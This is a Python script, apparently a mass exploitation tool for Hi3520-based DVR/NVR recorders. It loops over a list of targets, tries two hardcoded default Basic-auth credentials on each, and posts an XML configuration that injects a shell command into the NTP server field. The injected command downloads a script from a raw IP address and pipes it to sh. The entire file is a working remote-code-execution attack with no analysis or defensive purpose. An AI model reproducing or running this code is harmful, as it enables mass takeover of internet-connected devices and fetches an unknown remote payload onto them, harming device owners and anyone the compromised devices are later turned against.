import httplib2
import sys
import threading
import time

class exploit(threading.Thread):
    def __init__(self, target, auth):
        super(exploit, self).__init__()
        self.target = target 
        self.auth = auth
        self.start()

    def run(self):
        http = httplib2.Http(disable_ssl_certificate_validation=True, timeout=5)
        payload = '<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><SetConfiguration File="service.xml"><![CDATA[<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><Service><NTP Enable="True" Interval="86400" Server="{}"/></Service></DVR>]]></SetConfiguration></DVR>'
        # len of downloader script MUST be less than 28 char keep one char file name
        # disregarding this will break the RCE
        rce = payload.format("time.nist.gov&amp;wget http://107.152.39.215/d -O- |sh")
        headers = {
            'Host': "{}".format(self.target),
            'Authorization': "Basic {}".format(self.auth),
            'Content-Length': "{}".format(len(rce)),
            'Content-Type': "multipart/form-data; boundary=----DVRBoundary, text/xml",
            'Content-Disposition': "form-data; name=\"datafile\"; filename=\"command.xml\"",
            'Content-Type': 'text/xml'
        }
        url = "http://{}/dvr/cmd".format(self.target)
        try:
            _, __ = http.request(url, method='POST', headers=headers, body=rce)
            assert _['status'] == '200'
            assert '<SetConfigurationResponse Return="0"/>' in __
            print ('nvr-duck @ {}'.format(self.target))
        except:
            pass
with open(sys.argv[1], "r") as f:
    for line in f.readlines():
        for _ in ["cm9vdDppY2F0Y2g5OQ", "cmVwb3J0OnJlcG9ydA"]:
            exploit(line.strip("\r\n"), _)
        time.sleep(0.02)

